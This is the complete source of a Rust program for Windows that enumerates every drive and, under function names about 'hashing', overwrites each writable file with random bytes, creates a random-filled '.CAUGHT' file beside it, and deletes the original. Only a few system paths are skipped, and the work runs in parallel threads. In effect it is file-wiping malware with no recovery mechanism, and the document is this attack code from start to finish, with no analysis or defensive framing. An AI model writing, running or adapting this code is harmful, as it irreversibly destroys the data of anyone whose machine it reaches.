use std::io::Write;
use rand::prelude::*;
use std::path::{PathBuf, Path};
use std::fs::{self, File, OpenOptions};
use windows::Win32::Storage::FileSystem::GetLogicalDrives;
use std::thread::{self, JoinHandle, available_parallelism};

// Headers for print statements
const EROR_HEAD:&str = "[!] ";
const INFO_HEAD:&str = "[i] ";
const MISC_HEAD:&str = "[*] ";
const IMPT_HEAD:&str = "[#] ";

// Function for checking to see if we can write to a directory
fn CanEditDirectory(path: &str) -> bool
{
    let temp_file: PathBuf = Path::new(path).join("temp.temp222");
    match File::create_new(&temp_file)
    {
        Ok(_) => {
            match fs::remove_file(temp_file)
            {
                Ok(_) => {
                    return true;
                },
                Err(_) => {
                    println!("{}Cannot delete in directory: {:?}", EROR_HEAD, path);
                    return false;
                }
            }
        },
        Err(_) => {
            println!("{}Cannot write to directory: {:?}", EROR_HEAD, path);
            return false;
        }
    }
}

// Function to see if we can edit a file as we need to
fn CanEditFile(path: &str) -> bool
{
    return OpenOptions::new().write(true).open(path).is_ok();
}

fn IsBanned(path: &str) -> bool
{
    let banned_items: [&str; 10] = ["C:\\Windows", "C:\\Users\\Public", "C:\\Users\\Default", "C:\\Users\\All Users",
    "C:\\bootmgr", "C:\\BCD", "C:\\pagefile.sys", "C:\\hiberfil.sys", "C:\\Program Files", "$WINDOWS.~BT"];
    for item in banned_items
    {
        if item == path
        {
            return true;
        }
    }
    return false;
}

// Function for hashing a single file
fn HashFile(file: &PathBuf)
{
    let path_str: &str = file.as_path().to_str().unwrap();
    let mut new_data: [u8; 100] = [0u8; 100];
    let new_str: String = format!("{}{}", path_str, ".CAUGHT");
    let new_path: &Path = Path::new(new_str.as_str());
    match OpenOptions::new().write(true).read(false).open(file)
    {
        Ok(mut file_handle) => {
            let mut rng: ThreadRng = rand::rng();
            for _i in 0..4
            {
                rng.fill(&mut new_data);
                if new_data == [0u8; 100]
                {
                    println!("{}Failed to write new data to buffer!", EROR_HEAD);
                } else {
                    match file_handle.write(&new_data)
                    {
                        Ok(_) => {
                            _ = file_handle.flush();
                            continue;
                        },
                        Err(_) => {
                            ();
                        }
                    }
                }
                new_data = [0u8; 100];
            }
            let _ = drop(file_handle);
            match File::create_new(new_path)
            {
                Ok(mut file) => {
                    for _i in 0..4
                    {
                        rng.fill(&mut new_data);
                        if new_data == [0u8; 100]
                        {
                            println!("{}Failed to write data to buffer!", EROR_HEAD);
                        } else {
                            _ = file.write_all(&new_data);
                        }
                    }
                },
                Err(_) => {
                    ();
                }
            }
        },
        Err(_) => {
            ();
        }
    }
}

// Function for handling the hashing of several files in a linear fashion
fn HashFiles(files: Vec<PathBuf>)
{
    for file in files.iter()
    {
        HashFile(file);
        _ = fs::remove_file(&file);
    }
}

fn DiveIntoDrive(target_drive: PathBuf) -> Vec<PathBuf>
{
    let mut folders_to_search: Vec<PathBuf> = Vec::with_capacity(100000);
    let mut add_buffer: Vec<PathBuf> = Vec::with_capacity(1000);
    let mut files: Vec<PathBuf> = Vec::with_capacity(100000);
    println!("{}Getting file paths...", MISC_HEAD);
    folders_to_search.push(target_drive);
    while folders_to_search.len() > 0
    {
        for directory in folders_to_search.iter()
        {
            match fs::read_dir(&directory)
            {
                Ok(items) => {
                    for item in items
                    {
                        if let Ok(entry) = item
                        {
                            let entry_path: PathBuf = entry.path();
                            if IsBanned(entry_path.to_str().unwrap()) == false
                            {
                                if entry_path.is_dir() && CanEditDirectory(entry_path.to_str().unwrap())
                                {
                                    println!("{}Found path: {:?}", MISC_HEAD, entry_path.to_str().unwrap());
                                    add_buffer.push(PathBuf::from(entry_path));
                                } else if CanEditFile(entry_path.to_str().unwrap()){
                                    files.push(PathBuf::from(entry_path));
                                }
                            }
                        }
                    }
                },
                Err(_) => {
                    println!("{}Cannot read from directory: {:?}", EROR_HEAD, directory.to_str().unwrap());
                }
            }
        }
        folders_to_search.clear();
        folders_to_search.append(&mut add_buffer);
        add_buffer.clear();
    }
    return files;
}

fn main()
{
    // Creating variables for later, it is easiest if they are all in one location
    println!("{}Start of program...", IMPT_HEAD);
    let mut thread_groups: Vec<JoinHandle<()>> = Vec::new();
    let cpu_count: usize = available_parallelism().unwrap().get();
    let amount_per_thread: usize;
    let mut last_itteration: usize = 0;
    println!("{}Organizing files into thread groups...", INFO_HEAD);
    let mut thread_info: Vec<Vec<PathBuf>> = Vec::new();
    let mut remove_list: Vec<usize> = Vec::new();
    let mut files: Vec<PathBuf> = Vec::with_capacity(1000000);
    let drives = unsafe { GetLogicalDrives() };
    let mut drives_to_itterate: Vec<PathBuf> = Vec::with_capacity(81);

    // Enumerating drives for finding files, the alg is quick enough to be single threaded
    println!("{}Starting drive enumeration...", INFO_HEAD);
    for i in 0..26
    {
        if (drives >> i) & 1 == 1
        {
            let drive_label = format!("{}:\\", (b'A' + i) as char);
            drives_to_itterate.push(PathBuf::from(drive_label));
        }
    }
    println!("{}Gathering all files...", INFO_HEAD);
    for drive in drives_to_itterate
    {
        println!("{}Starting enumeration of drive \'{:?}\'", INFO_HEAD, drive.to_str().unwrap());
        files.append(&mut DiveIntoDrive(drive));
    }
    println!("{}Gathered {:?} files.", MISC_HEAD, files.len());

    // Starting the hashing of files through thread groups
    println!("{}Sorting files into thread groups...", MISC_HEAD);
    amount_per_thread = files.len() / cpu_count;
    for _i in 0..cpu_count
    {
        let mut file_group: Vec<PathBuf> = Vec::new();
        for i in last_itteration..(last_itteration + amount_per_thread)
        {
            file_group.push(files[i].clone());
        }
        last_itteration += amount_per_thread;
        thread_info.push(file_group);
    }
    println!("{}Created {:?} thread groups...", MISC_HEAD, thread_info.len());
    println!("{}Adding thread data to live threads...", MISC_HEAD);
    for i in thread_info.clone()
    {
        thread_groups.push(thread::spawn(move || {
            HashFiles(i.to_owned());
        }));
    }

    // Closing threads once they are done hashing files
    while !thread_groups.is_empty()
    {
        let mut itterator: usize = 0;
        for handle in thread_groups.iter()
        {
            if handle.is_finished()
            {
                remove_list.push(itterator);
            }
            itterator += 1;
        }
        for i in remove_list.iter()
        {
            thread_groups.remove(*i);
        }
        remove_list.clear();
    }
}
